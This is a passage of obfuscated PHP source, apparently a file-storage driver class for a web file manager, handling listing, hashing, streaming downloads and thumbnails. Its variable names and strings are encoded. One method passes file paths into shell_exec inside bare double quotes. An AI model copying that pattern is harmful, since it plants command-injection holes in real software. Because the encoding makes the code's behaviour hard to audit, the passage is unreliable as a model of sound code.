file_put_contents($†¡•¹ş, $©™Š˜ĞÄ); } return $†¡•¹ş; } public function tempFileRemve($ÔöÊ©¶Ø) { @unlink($ÔöÊ©¶Ø); @rmdir($this->pathFather($ÔöÊ©¶Ø)); } public function mkfile($ˆ™°˜ŞÈ, $®ÊÖ‡¡Ä = '', $Ë¯…ù¢¶ = REPEAT_RENAME) { } public function mkdir($ÅÌ°·­, $§«î’ÉÍ = REPEAT_SKIP) { } public function delFile($†Åª›şŒ) { } public function delFolder($«£ÎÍÀú) { } public function copyFile($©´÷êçã, $Ô«¯™¦±) { } public function moveFile($Êá’Á©, $×í´¹Âù) { } public function remove($š‘±šœã) { if ($this->isFile($š‘±šœã)) { return $this->delFile($š‘±šœã); } return $this->delFolder($š‘±šœã); } public function rename($¡«”•Ï¶, $øÕ·ãù’) { } public function exist($¢Ö¼¢) { } public function findByHash($âáµ±˜ = '', $ë›·£ó = '') { return !1; } public function isFile($ÕÌ´¸½¼) { } public function isFolder($×„òœöù) { } public function size($Ÿ“”»†œ) { } public function info($É×İ˜Æú) { } public function infoSimple($¦è×µ§) { return $this->info($¦è×µ§); } public function infoAuth($æé’Ë°) { return $this->info($æé’Ë°); } public function infoFull($¹¨ ¶öÌ) { return $this->info($¹¨ ¶öÌ); } public function infoWithChildren($Ï³ „Óˆ) { $Ì°–ÓûŞ =& $_SERVER[ä¿÷‹µ±]; static $ã¯ôÍ…ğ = array(); if (isset($ã¯ôÍ…ğ[$Ï³ „Óˆ])) { return $ã¯ôÍ…ğ[$Ï³ „Óˆ]; } $Ú¬ò¦–× = $this->info($Ï³ „Óˆ); if ($Ú¬ò¦–× && $Ú¬ò¦–×[$Ì°–ÓûŞ[33]] == $Ì°–ÓûŞ[75]) { $ïÌ˜ÀŒ = array($Ì°–ÓûŞ[76] => 0, $Ì°–ÓûŞ[77] => 0, $Ì°–ÓûŞ[78] => 0); $this->infoChildren($Ï³ „Óˆ, $ïÌ˜ÀŒ); $Ú¬ò¦–×[$Ì°–ÓûŞ[76]] = $ïÌ˜ÀŒ[$Ì°–ÓûŞ[76]]; $Ú¬ò¦–×[$Ì°–ÓûŞ[79]] = array($Ì°–ÓûŞ[80] => $ïÌ˜ÀŒ[$Ì°–ÓûŞ[77]], $Ì°–ÓûŞ[81] => $ïÌ˜ÀŒ[$Ì°–ÓûŞ[78]]); $ã¯ôÍ…ğ[$Ï³ „Óˆ] = $Ú¬ò¦–×; } return $Ú¬ò¦–×; } public function listPath($•å©»é˜, $…¤çëôÇ = false) { } public function has($Õã¼ıš£, $ÃÜÕÏÜ… = false, $¤¥ Î”« = false) { } public function canRead($×ÂÆĞ) { } public function canWrite($›°Á¢ùŞ) { } public function getContent($¯È‘¬â) { } public function setContent($å£”ÖÖİ, $ğÂŠ·æÜ = '') { } protected function infoChildren($êÖ‡’§, &$…º»‰Á ) { $óÑ‰×­ò =& $_SERVER[ä¿÷‹µ±]; check_abort_echo(); $Ã·È¨ÎË = $this->listPath($êÖ‡’§, !0); $Ã·È¨ÎË = array_merge($Ã·È¨ÎË[$óÑ‰×­ò[82]], $Ã·È¨ÎË[$óÑ‰×­ò[83]]); foreach ($Ã·È¨ÎË as $Œú¬ÀØ¥) { if ($Œú¬ÀØ¥[$óÑ‰×­ò[33]] == $óÑ‰×­ò[75]) { $…º»‰Á [$óÑ‰×­ò[78]]++; $¥Ï¡¾ßØ = $this->getPathInner($Œú¬ÀØ¥[$óÑ‰×­ò[84]]); $this->infoChildren($¥Ï¡¾ßØ, $…º»‰Á ); } else { $…º»‰Á [$óÑ‰×­ò[77]]++; $…º»‰Á [$óÑ‰×­ò[76]] += $Œú¬ÀØ¥[$óÑ‰×­ò[76]]; } } } public function fileSubstr($ª¼½ÑÊ¡, $‹êß×·›, $æû²Êœ) { } public function listAll($ªƒñäÉ•) { } public function listAllMake($Áíà³„, &$Ô¬ã‚„Š) { $¦ëñ¡’¾ =& $_SERVER[ä¿÷‹µ±]; check_abort_echo(); $€»î‹Á = $this->listPath($Áíà³„, !0); if (!$€»î‹Á) { return; } $§Ùà–úú = array_merge($€»î‹Á[$¦ëñ¡’¾[82]], $€»î‹Á[$¦ëñ¡’¾[83]]); foreach ($§Ùà–úú as $›óëÏÚ˜) { $Èˆ‰Ç‚© = $›óëÏÚ˜[$¦ëñ¡’¾[33]] == $¦ëñ¡’¾[75]; $ùıÂÈë = array($¦ëñ¡’¾[84] => $›óëÏÚ˜[$¦ëñ¡’¾[84]], $¦ëñ¡’¾[75] => $Èˆ‰Ç‚©); if (isset($›óëÏÚ˜[$¦ëñ¡’¾[76]])) { $ùıÂÈë[$¦ëñ¡’¾[76]] = $›óëÏÚ˜[$¦ëñ¡’¾[76]]; } if (isset($›óëÏÚ˜[$¦ëñ¡’¾[85]])) { $ùıÂÈë[$¦ëñ¡’¾[85]] = $›óëÏÚ˜[$¦ëñ¡’¾[85]]; } if (!$Èˆ‰Ç‚©) { $Ô¬ã‚„Š[] = $ùıÂÈë; continue; } $Ô¬ã‚„Š[] = $ùıÂÈë; $èÑ‚ÚŠ = $›óëÏÚ˜[$¦ëñ¡’¾[84]]; $¥ĞÂ“ı = $this->pathDriver; if (substr($›óëÏÚ˜[$¦ëñ¡’¾[84]], 0, strlen($¥ĞÂ“ı)) == $¥ĞÂ“ı) { $èÑ‚ÚŠ = substr($èÑ‚ÚŠ, strlen($¥ĞÂ“ı)); } $this->listAllMake($èÑ‚ÚŠ, $Ô¬ã‚„Š); } } public function listAllSimple($ìæªòÇ) { $…¨’¤ò‹ =& $_SERVER[ä¿÷‹µ±]; $±âì×› = array(); $±Øüˆ¥Î = $this->listAll($ìæªòÇ); $¸éßÛÜ’ = $this->getPathOuter($ìæªòÇ); foreach ($±Øüˆ¥Î as $åùô›Æ¯) { $àïêÏ–õ = $åùô›Æ¯[$…¨’¤ò‹[84]]; $°Ë˜¬¨à = $åùô›Æ¯[$…¨’¤ò‹[84]]; if (isset($åùô›Æ¯[$…¨’¤ò‹[86]])) { $àïêÏ–õ = $åùô›Æ¯[$…¨’¤ò‹[86]][$…¨’¤ò‹[84]]; $åùô›Æ¯[$…¨’¤ò‹[76]] = $åùô›Æ¯[$…¨’¤ò‹[86]][$…¨’¤ò‹[76]]; $åùô›Æ¯[$…¨’¤ò‹[85]] = $åùô›Æ¯[$…¨’¤ò‹[86]][$…¨’¤ò‹[85]]; } else { $°Ë˜¬¨à = substr($åùô›Æ¯[$…¨’¤ò‹[84]], strlen(get_path_father($¸éßÛÜ’))); $°Ë˜¬¨à = $…¨’¤ò‹[8] . ltrim($°Ë˜¬¨à, $…¨’¤ò‹[8]); } $ıÏûÕŸß = array($…¨’¤ò‹[84] => $°Ë˜¬¨à, $…¨’¤ò‹[75] => $åùô›Æ¯[$…¨’¤ò‹[75]]); if (isset($åùô›Æ¯[$…¨’¤ò‹[76]]) && !$åùô›Æ¯[$…¨’¤ò‹[75]]) { $ıÏûÕŸß[$…¨’¤ò‹[76]] = $åùô›Æ¯[$…¨’¤ò‹[76]]; } if (isset($åùô›Æ¯[$…¨’¤ò‹[85]])) { $ıÏûÕŸß[$…¨’¤ò‹[85]] = $åùô›Æ¯[$…¨’¤ò‹[85]]; } if (!$åùô›Æ¯[$…¨’¤ò‹[75]]) { $ıÏûÕŸß[$…¨’¤ò‹[87]] = $àïêÏ–õ; } $±âì×›[] = $ıÏûÕŸß; } return $±âì×›; } public function upload($Ó¡«Ôşê, $‹…¶Åœ™, $ÕÁ‰ó«¼ = false, $®²Á¼« = REPEAT_REPLACE) { } public function uploadFileByID($™”½¥‡’, $êË±™¯É, $È“¤¬ğú) { } public function uploadFileByPath($ÉßÍÓŸ­, $³ÆïØô¾, $“Ê‡áÇ = array()) { } public function isUploadServer() { $ù€¨À½à =& $_SERVER[ä¿÷‹µ±]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ù€¨À½à[88]) { return !0; } return $GLOBALS[$ù€¨À½à[6]][$ù€¨À½à[89]][$ù€¨À½à[90]]; } public function isFileOutServer() { $Ş±…Ş– =& $_SERVER[ä¿÷‹µ±]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ş±…Ş–[88]) { return !0; } return $GLOBALS[$Ş±…Ş–[6]][$Ş±…Ş–[89]][$Ş±…Ş–[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($íƒ„’¤†) { $¦àÉãŞë =& $_SERVER[ä¿÷‹µ±]; if (!$this->isCdnHost()) { return $íƒ„’¤†; } return str_replace(trim(get_url_root($íƒ„’¤†), $¦àÉãŞë[8]), trim($this->cdnHost, $¦àÉãŞë[8]), $íƒ„’¤†); } public function uploadLink($äè£“õˆ, $–…ú®Í² = 0) { $¥Óó¶¹ =& $_SERVER[ä¿÷‹µ±]; if ($this->isUploadServer()) { return; } $§ş‚¸Œ = $this->getType(); if (!in_array($§ş‚¸Œ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ê”÷© = 1024 * 1024 * 10; $˜±÷¸£® = $–…ú®Í² <= $ê”÷© ? $¥Óó¶¹[92] : $¥Óó¶¹[93]; $î™®İãå = (!$–…ú®Í² ? 1 : ceil($–…ú®Í² / pow(1024, 3))) * 3600 * 4; $ŠÁ„Ò·„ = $this->{$˜±÷¸£®}($äè£“õˆ, $î™®İãå); if ($ŠÁ„Ò·„) { $ŠÁ„Ò·„[$¥Óó¶¹[94]] = $äè£“õˆ; $ŠÁ„Ò·„[$¥Óó¶¹[95]] = $§ş‚¸Œ; } return $ŠÁ„Ò·„; } public function uploadFormData($È¤ô”£×, $Œ×²ÕÈ¡ = 3600) { } public function multiUploadFormData($„¸¼ÓÑ¾, $óÑ‡¥Œƒ = 3600) { } public function download($Úü·ôÂ, $ü†á²Æô) { } public function ext($°ÁŞÅâ) { $üƒÅò§¹ =& $_SERVER[ä¿÷‹µ±]; if (strpos($°ÁŞÅâ, $üƒÅò§¹[8]) === -1) { $ƒèóœ’ = $°ÁŞÅâ; } else { $ƒèóœ’ = $this->pathThis($°ÁŞÅâ); } $½”¾Ñ‚Ñ = $üƒÅò§¹[12]; if (strstr($ƒèóœ’, $üƒÅò§¹[10])) { $½”¾Ñ‚Ñ = substr($ƒèóœ’, strrpos($ƒèóœ’, $üƒÅò§¹[10]) + 1); $½”¾Ñ‚Ñ = strtolower($½”¾Ñ‚Ñ); } if (strlen($½”¾Ñ‚Ñ) > 3 && preg_match($üƒÅò§¹[96], $½”¾Ñ‚Ñ, $Â…«·”ö)) { $½”¾Ñ‚Ñ = $üƒÅò§¹[12]; } return $½”¾Ñ‚Ñ; } public function pathThis($•Ò«“ßò) { $ääİª³— =& $_SERVER[ä¿÷‹µ±]; $•Ò«“ßò = str_replace($ääİª³—[97], $ääİª³—[8], rtrim($•Ò«“ßò, $ääİª³—[8])); $Õƒ€ùĞ = strrpos($•Ò«“ßò, $ääİª³—[8]); if ($Õƒ€ùĞ === !1) { return $•Ò«“ßò; } return substr($•Ò«“ßò, $Õƒ€ùĞ + 1); } public function pathFather($İ¢„ã®´) { $¤âÅí„× =& $_SERVER[ä¿÷‹µ±]; $İ¢„ã®´ = str_replace($¤âÅí„×[97], $¤âÅí„×[8], rtrim($İ¢„ã®´, $¤âÅí„×[8])); $Ö—×îÙô = strrpos($İ¢„ã®´, $¤âÅí„×[8]); if ($Ö—×îÙô === !1) { return $¤âÅí„×[12]; } return substr($İ¢„ã®´, 0, $Ö—×îÙô + 1); } public function hashSimple($‚³‹¬ Î) { $ÆŞ£ËÙá =& $_SERVER[ä¿÷‹µ±]; if (!$‚³‹¬ Î) { return md5($ÆŞ£ËÙá[12]); } $ÔŞ©ÏİÙ = $this->size($‚³‹¬ Î); $öÊ©Öç = 200; $Ö˜Ÿğø› = 50; if ($ÔŞ©ÏİÙ <= $öÊ©Öç * $Ö˜Ÿğø›) { return $this->hashMd5($‚³‹¬ Î) . $ÔŞ©ÏİÙ; } $—¡³«ã = intval($ÔŞ©ÏİÙ / $Ö˜Ÿğø›); $Æ‰çÔ›ä = $ÆŞ£ËÙá[12]; for ($È» Õ°’ = 0; $È» Õ°’ < $Ö˜Ÿğø›; $È» Õ°’++) { $Æ‰çÔ›ä .= $this->fileSubstr($‚³‹¬ Î, $—¡³«ã * $È» Õ°’, $öÊ©Öç); } $Æ‰çÔ›ä .= $this->fileSubstr($‚³‹¬ Î, $ÔŞ©ÏİÙ - $öÊ©Öç, $öÊ©Öç); return md5($Æ‰çÔ›ä) . $ÔŞ©ÏİÙ; } public static $md5Cache = array(); public function hashMd5($Å±€Òø®) { if (!$Å±€Òø®) { return md5($_SERVER[ä¿÷‹µ±][12]); } $Å±€Òø® = $this->iconvSystem($Å±€Òø®); if (isset(self::$md5Cache[$Å±€Òø®])) { return self::$md5Cache[$Å±€Òø®]; } self::$md5Cache[$Å±€Òø®] = $this->hashMd5Shell($Å±€Òø®); if (!self::$md5Cache[$Å±€Òø®]) { self::$md5Cache[$Å±€Òø®] = @md5_file($Å±€Òø®); } return self::$md5Cache[$Å±€Òø®]; } private function hashMd5Shell($ªà†à¦Ş) { $æÖŸ—ÂÁ =& $_SERVER[ä¿÷‹µ±]; if (!$ªà†à¦Ş) { return md5($æÖŸ—ÂÁ[12]); } if (!function_exists($æÖŸ—ÂÁ[98])) { return !1; } $ÕõªÓ…¢ = array($æÖŸ—ÂÁ[99], $æÖŸ—ÂÁ[100]); $İã£óÜ» = Cache::get($æÖŸ—ÂÁ[101]); if (!$İã£óÜ») { $¾›ğ…Õã = BASIC_PATH . $æÖŸ—ÂÁ[102]; $õŞìŞ¦† = md5_file($¾›ğ…Õã); $İã£óÜ» = $æÖŸ—ÂÁ[103]; foreach ($ÕõªÓ…¢ as $é‹ôùá) { $ÄöæêÊÂ = shell_exec($é‹ôùá . "\x20\42{$¾›ğ…Õã}\42"); if ($ÄöæêÊÂ && substr(trim($ÄöæêÊÂ), 0, 32) == $õŞìŞ¦†) { $İã£óÜ» = $é‹ôùá; break; } } Cache::set($æÖŸ—ÂÁ[101], $İã£óÜ», 3600); } if ($İã£óÜ» == $æÖŸ—ÂÁ[103]) { return !1; } $ÄöæêÊÂ = shell_exec($İã£óÜ» . "\x20\x22{$ªà†à¦Ş}\42"); $ÄöæêÊÂ = str_replace($æÖŸ—ÂÁ[104], $æÖŸ—ÂÁ[12], $ÄöæêÊÂ); return substr($ÄöæêÊÂ, 0, 32); } public function link($Ò€èó í) { return $Ò€èó í; } public function fileOut($ë‚ÄúãË, $—æ¸ñ•¢ = false, $ã©ëœÌç = false, $É¿¨ÂŞ‰ = '') { $¸ñ¤®áô =& $_SERVER[ä¿÷‹µ±]; $this->cacheMethod(null, null); if (!$ë‚ÄúãË || !$this->exist($ë‚ÄúãË)) { show_json(LNG($¸ñ¤®áô[105]), !1, $ã©ëœÌç); } $¸„Ä‡×É = $this->getType() == $¸ñ¤®áô[106]; $ËÜŸÑ±€ = $GLOBALS[$¸ñ¤®áô[6]][$¸ñ¤®áô[89]][$¸ñ¤®áô[107]][$¸ñ¤®áô[108]]; $¿‡„ú¡ã = (double) $GLOBALS[$¸ñ¤®áô[6]][$¸ñ¤®áô[89]][$¸ñ¤®áô[107]][$¸ñ¤®áô[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $´ÀˆíŠ£ = $this->infoFull($ë‚ÄúãË); $ä½ÏÇˆÕ = $´ÀˆíŠ£[$¸ñ¤®áô[76]]; $©÷¶¶õ¬ = gmdate($¸ñ¤®áô[110], $´ÀˆíŠ£[$¸ñ¤®áô[85]]); $ÜÓÇ†‚Œ = $ã©ëœÌç ? $ã©ëœÌç : $this->iconvApp($´ÀˆíŠ£[$¸ñ¤®áô[32]]); $¿ôı¿ó€ = 0; $Ø™½Î‡â = $ä½ÏÇˆÕ - 1; $©¡ŸÛî€ = $this->ext($ÜÓÇ†‚Œ); if (in_array($©¡ŸÛî€, array($¸ñ¤®áô[111], $¸ñ¤®áô[112], $¸ñ¤®áô[113], $¸ñ¤®áô[114]))) { $©¡ŸÛî€ = $¸ñ¤®áô[115]; } if (in_array($©¡ŸÛî€, array($¸ñ¤®áô[116]))) { $©¡ŸÛî€ = $¸ñ¤®áô[117]; } if (!$É¿¨ÂŞ‰) { $É¿¨ÂŞ‰ = md5($©÷¶¶õ¬ . $this->hashSimple($ë‚ÄúãË)); } $É¿¨ÂŞ‰ = $¸ñ¤®áô[118] . $É¿¨ÂŞ‰ . $¸ñ¤®áô[118]; $İíÒì‹Œ = get_file_mime($©¡ŸÛî€); $½®®İì¡ = !0; $½®®İì¡ = isset($_GET[$¸ñ¤®áô[119]]) ? !1 : !0; if ($—æ¸ñ•¢ === !1 && !mime_support($İíÒì‹Œ)) { $İíÒì‹Œ = $¸ñ¤®áô[120]; } header($¸ñ¤®áô[121]); header($¸ñ¤®áô[122] . $İíÒì‹Œ); $‘åúë™ = rawurlencode($ÜÓÇ†‚Œ); $‘åúë™ = $¸ñ¤®áô[118] . $‘åúë™ . $¸ñ¤®áô[123] . $‘åúë™; if ($—æ¸ñ•¢) { header($¸ñ¤®áô[124]); header($¸ñ¤®áô[125] . $‘åúë™); } else { if ($½®®İì¡) { header($¸ñ¤®áô[126] . $‘åúë™); } } header($¸ñ¤®áô[127] . gmdate($¸ñ¤®áô[110], time() + 3600 * 24 * 30) . $¸ñ¤®áô[128]); header($¸ñ¤®áô[129]); header($¸ñ¤®áô[130]); header($¸ñ¤®áô[131]); if (isset($_SERVER[$¸ñ¤®áô[132]]) && strtotime($_SERVER[$¸ñ¤®áô[132]]) == $´ÀˆíŠ£[$¸ñ¤®áô[85]]) { header($¸ñ¤®áô[133], !0, 304); die; } if (isset($_SERVER[$¸ñ¤®áô[134]]) && $_SERVER[$¸ñ¤®áô[134]] == $É¿¨ÂŞ‰) { header($¸ñ¤®áô[135] . $É¿¨ÂŞ‰, !0, 304); die; } header($¸ñ¤®áô[135] . $É¿¨ÂŞ‰); header($¸ñ¤®áô[136] . $©÷¶¶õ¬ . $¸ñ¤®áô[128]); header($¸ñ¤®áô[137] . $ÜÓÇ†‚Œ); header($¸ñ¤®áô[138]); header($¸ñ¤®áô[139] . $ä½ÏÇˆÕ); header($¸ñ¤®áô[140]); if (!$—æ¸ñ•¢ && $©¡ŸÛî€ == $¸ñ¤®áô[141]) { if ($ä½ÏÇˆÕ > 1024 * 1024 * 5) { die; } $øÀÒï¶ª = $this->getContent($ë‚ÄúãË); $øÀÒï¶ª = Html::clearSVG($øÀÒï¶ª); header($¸ñ¤®áô[142] . strlen($øÀÒï¶ª)); echo $øÀÒï¶ª; die; } $¹ùŠ‚ÏÙ = strtolower($_SERVER[$¸ñ¤®áô[143]]); if ($¸„Ä‡×É && $¹ùŠ‚ÏÙ && $ËÜŸÑ±€) { if (strstr($¹ùŠ‚ÏÙ, $¸ñ¤®áô[144])) { header($¸ñ¤®áô[145] . $ë‚ÄúãË); } else { if (strstr($¹ùŠ‚ÏÙ, $¸ñ¤®áô[146])) { header($¸ñ¤®áô[147] . $ë‚ÄúãË); } else { if (strstr($¹ùŠ‚ÏÙ, $¸ñ¤®áô[148])) { header($¸ñ¤®áô[149] . $ë‚ÄúãË); } } } if ($¿‡„ú¡ã) { header($¸ñ¤®áô[150] . $¿‡„ú¡ã); } return; } if (isset($_SERVER[$¸ñ¤®áô[151]])) { if (preg_match($¸ñ¤®áô[152], $_SERVER[$¸ñ¤®áô[151]], $ã—™£‹)) { $¿ôı¿ó€ = intval($ã—™£‹[1]); if (!empty($ã—™£‹[2])) { $Ø™½Î‡â = intval($ã—™£‹[2]); } } header($¸ñ¤®áô[153]); header("\103\x6f\x6e\164\x65\x6e\164\55\x52\141\156\x67\x65\72\40\x62\x79\x74\x65\x73\x20{$¿ôı¿ó€}\55{$Ø™½Î‡â}\x2f" . $ä½ÏÇˆÕ); } else { header($¸ñ¤®áô[154]); } header($¸ñ¤®áô[155]); $ÑÇÄ„ƒ = !0; if ($_SERVER[$¸ñ¤®áô[156]] == $¸ñ¤®áô[157] && $ä½ÏÇˆÕ > 1204 * 1024 * 1024 * 2) { $ÑÇÄ„ƒ = !1; } if ($ÑÇÄ„ƒ) { header($¸ñ¤®áô[158] . ($Ø™½Î‡â - $¿ôı¿ó€ + 1)); } if ($_SERVER[$¸ñ¤®áô[159]] == $¸ñ¤®áô[160]) { return; } $ğ¡‚ĞÖ = 1024 * 100; $‰àôò³ù = 0; if ($¿‡„ú¡ã) { $‰àôò³ù = intval(1000 * 1000 * ($ğ¡‚ĞÖ / $¿‡„ú¡ã)); } while ($¿ôı¿ó€ <= $Ø™½Î‡â) { $®Æ‡ç = timeFloat(); check_abort(); $Š¶­Åâ¹ = $Ø™½Î‡â - $¿ôı¿ó€ + 1; if ($Š¶­Åâ¹ <= $ğ¡‚ĞÖ) { $ğ¡‚ĞÖ = $Š¶­Åâ¹; } echo $this->fileSubstr($ë‚ÄúãË, $¿ôı¿ó€, $ğ¡‚ĞÖ); $¿ôı¿ó€ += $ğ¡‚ĞÖ; if ($ğ¡‚ĞÖ == $Š¶­Åâ¹) { $¿ôı¿ó€ = $Ø™½Î‡â + 1; } if ($‰àôò³ù) { $ˆ¸ù‘Ö = intval(1000 * 1000 * (timeFloat() - $®Æ‡ç)); $íºæ‰œ = $‰àôò³ù - $ˆ¸ù‘Ö; if ($íºæ‰œ > 5) { usleep($íºæ‰œ); } } } } public function fileOutServer($ØˆÃ‰€, $ºùŒã­£ = false, $ÈàïèÏ“ = false, $¥“¨Œöù = '') { $this->fileOut($ØˆÃ‰€, $ºùŒã­£, $ÈàïèÏ“, $¥“¨Œöù); } public function fileOutLink($ûÀ¤¥Ğ¾) { header($_SERVER[ä¿÷‹µ±][161] . $ûÀ¤¥Ğ¾); die; } public function cacheMethod($ÉÓÊ ”, $ˆïÀœ‘Ç, $Ÿ«ûÎ¼× = null) { $à€¯òÈ =& $_SERVER[ä¿÷‹µ±]; static $ğîÂß­Ş = array(); $ĞÃßà“é = $ˆïÀœ‘Ç ? ltrim($this->getPathOuter($ˆïÀœ‘Ç), $à€¯òÈ[8]) : $à€¯òÈ[12]; $ªÉ¢Ÿ·á = $à€¯òÈ[162] . $ÉÓÊ ” . $à€¯òÈ[163] . rtrim($ĞÃßà“é, $à€¯òÈ[8]); if (is_null($ÉÓÊ ”)) { $ğîÂß­Ş = array(); return; } if (is_null($ˆïÀœ‘Ç)) { foreach ($ğîÂß­Ş as $ªÉ¢Ÿ·á => $¥±ƒ¥Œ) { if (!strstr($ªÉ¢Ÿ·á, $à€¯òÈ[162] . $ÉÓÊ ” . $à€¯òÈ[164])) { continue; } unset($ğîÂß­Ş[$ªÉ¢Ÿ·á]); } return; } if (!is_null($Ÿ«ûÎ¼×)) { $ğîÂß­Ş[$ªÉ¢Ÿ·á] = $Ÿ«ûÎ¼×; return; } $¢œ›€Á‚ = isset($ğîÂß­Ş[$ªÉ¢Ÿ·á]) ? $ğîÂß­Ş[$ªÉ¢Ÿ·á] : null; if (!is_null($¢œ›€Á‚)) { return $¢œ›€Á‚; } $¢œ›€Á‚ = $this->{$ÉÓÊ ”}($ˆïÀœ‘Ç); $ğîÂß­Ş[$ªÉ¢Ÿ·á] = $¢œ›€Á‚; return $¢œ›€Á‚; } public function cacheMethodInfoSet($­ƒ‚‰İ, $¹ñÌòÜ°, $â­ “¸¤ = false) { $ïş™—³ =& $_SERVER[ä¿÷‹µ±]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ïş™—³[165], $­ƒ‚‰İ, $¹ñÌòÜ°); $this->cacheMethod($ïş™—³[166], $­ƒ‚‰İ, $¹ñÌòÜ° ? !1 : !0); if (is_array($â­ “¸¤)) { $this->cacheMethod($ïş™—³[167], $­ƒ‚‰İ, $â­ “¸¤); } } public function fileOutImage($Çú×Óå‚, $øİ®‰ÄŞ = 250) { $é¢“½¿ =& $_SERVER[ä¿÷‹µ±]; set_timeout(); if (substr($Çú×Óå‚, 0, 4) == $é¢“½¿[148]) { $this->fileOutLink($Çú×Óå‚); } $›™¾— = $this->info($Çú×Óå‚); $ãƒêœ¸… = $›™¾—[$é¢“½¿[32]]; $©äÛ¸¹æ = !1; if (isset($GLOBALS[$é¢“½¿[168]]) && $GLOBALS[$é¢“½¿[168]][$é¢“½¿[84]] == $›™¾—[$é¢“½¿[84]]) { $Ğƒ‹×ˆ = $GLOBALS[$é¢“½¿[168]][$é¢“½¿[169]]; if (!$›™¾—[$é¢“½¿[170]]) { $›™¾—[$é¢“½¿[170]] = $GLOBALS[$é¢“½¿[168]]; } if (isset($Ğƒ‹×ˆ[$é¢“½¿[171]])) { if ($Ğƒ‹×ˆ[$é¢“½¿[171]] <= $øİ®‰ÄŞ && $Ğƒ‹×ˆ[$é¢“½¿[172]] <= $øİ®‰ÄŞ) { $©äÛ¸¹æ = !0; } } $ãƒêœ¸… = $›™¾—[$é¢“½¿[170]][$é¢“½¿[32]]; } if ($›™¾—[$é¢“½¿[76]] <= 1024 * 50 || $©äÛ¸¹æ || !function_exists($é¢“½¿[173]) || $›™¾—[$é¢“½¿[174]] == $é¢“½¿[175]) { return $this->fileOut($Çú×Óå‚, !1, $ãƒêœ¸…); } if (isset($›™¾—[$é¢“½¿[170]][$é¢“½¿[176]])) { $ç°ãÌÖˆ = $›™¾—[$é¢“½¿[170]][$é¢“½¿[176]]; } else { if (isset($›™¾—[$é¢“½¿[170]][$é¢“½¿[177]])) { $ç°ãÌÖˆ = $›™¾—[$é¢“½¿[170]][$é¢“½¿[177]]; } } if (!$ç°ãÌÖˆ) { $ç°ãÌÖˆ = md5("{$›™¾—[$é¢“½¿[32]]}\x5f{$›™¾—[$é¢“½¿[84]]}\137{$›™¾—[$é¢“½¿[76]]}\x5f{$øİ®‰ÄŞ}"); } $î¥Ñ…êŸ = "{$ç°ãÌÖˆ}\x5f{$øİ®‰ÄŞ}\56\160\156\x67"; if (!($¨œÔ¾æ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $é¢“½¿[178]))) { $Êïƒ©Ú… = IO::mkdir(IO_PATH_SYSTEM_TEMP . $é¢“½¿[179]); } else { $Êïƒ©Ú… = KodIO::make($¨œÔ¾æ); } if ($¨œÔ¾æ = IO::fileNameExist($Êïƒ©Ú…, $î¥Ñ…êŸ)) { $ÏŠåªÄë = KodIO::make($¨œÔ¾æ); return IO::fileOut($ÏŠåªÄë, !1, $ãƒêœ¸…); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ÏŠåªÄë = DATA_THUMB . $î¥Ñ…êŸ; del_file($ÏŠåªÄë); if (!@file_exists($ÏŠåªÄë)) { $ã©§ ¸‚ = TEMP_FILES; if (!is_dir($ã©§ ¸‚)) { mk_dir($ã©§ ¸‚); } $¥ƒì¦…º = $ã©§ ¸‚ . $ç°ãÌÖˆ . $é¢“½¿[10] . $›™¾—[$é¢“½¿[174]]; if (!@file_exists($¥ƒì¦…º)) { $¥ƒì¦…º = $this->download($Çú×Óå‚, $¥ƒì¦…º); } ImageThumb::createThumb($¥ƒì¦…º, $ÏŠåªÄë, $øİ®‰ÄŞ, $øİ®‰ÄŞ * 10); } if (!file_exists($ÏŠåªÄë) || filesize($ÏŠåªÄë) < 100) { return @file_exists($¥ƒì¦…º) ? IO::fileOut($¥ƒì¦…º) : $this->fileOut($Çú×Óå‚); } if (!($İÖ°¼Òô = IO::move($ÏŠåªÄë, $Êïƒ©Ú…))) { return IO::fileOut($ÏŠåªÄë); } del_file($ÏŠåªÄë); IO::fileOut($İÖ°¼Òô); } public function fileOutImageServer($¾Ù±·ºš, $ì‹èÂ‘¬ = 250) { $this->fileOutImage($¾Ù±·ºš, $ì‹èÂ‘¬); } public function fileNameAuto($À¼ñâ·, $Ñ€°¤ãÛ, $—Ì§±Ü— = REPEAT_RENAME, $¼Ÿ¢øà® = false) { $È¯Óş¦¯ =& $_SERVER[ä¿÷‹µ±]; $¯§âÚµç = $À¼ñâ· === $È¯Óş¦¯[12] ? $Ñ€°¤ãÛ : rtrim($À¼ñâ·, $È¯Óş¦¯[8]) . $È¯Óş¦¯[8] . $Ñ€°¤ãÛ; if ($—Ì§±Ü— == REPEAT_REPLACE || !$this->exist($¯§âÚµç) || $¼Ÿ¢øà® && $—Ì§±Ü— != REPEAT_RENAME_FOLDER) { return $Ñ€°¤ãÛ; } if ($—Ì§±Ü— == REPEAT_SKIP) { return !1; } $ƒÍ¢ë—ô = $È¯Óş¦¯[10] . get_path_ext($Ñ€°¤ãÛ); $ƒÍ¢ë—ô = $ƒÍ¢ë—ô == $È¯Óş¦¯[10] || $¼Ÿ¢øà® ? $È¯Óş¦¯[12] : $ƒÍ¢ë—ô; $­¥¡ñìÅ = 1; $ïØÖıÈÁ = substr($Ñ€°¤ãÛ, 0, strlen($Ñ€°¤ãÛ) - strlen($ƒÍ¢ë—ô)); $”êƒœŸë = $ïØÖıÈÁ . "\50{$­¥¡ñìÅ}\51{$ƒÍ¢ë—ô}"; while ($this->exist(rtrim($À¼ñâ·, $È¯Óş¦¯[8]) . $È¯Óş¦¯[8] . $”êƒœŸë)) { $”êƒœŸë = $ïØÖıÈÁ . "\x28{$­¥¡ñìÅ}\51{$ƒÍ¢ë—ô}"; $­¥¡ñìÅ++; } return $”êƒœŸë; } private function fileNameAutoList($Î†Â‡ÛÃ, $’µ„³—¢, $íò§’êÏ = false) { $ÅÃ˜àÖº =& $_SERVER[ä¿÷‹µ±]; $ÍçĞ¡ó± = $this->listPath($Î†Â‡ÛÃ, !0); $ÍçĞ¡ó± = array_merge($ÍçĞ¡ó±[$ÅÃ˜àÖº[82]], $ÍçĞ¡ó±[$ÅÃ˜àÖº[83]]); $æ¹ôÎà‘ = array_to_keyvalue($ÍçĞ¡ó±, 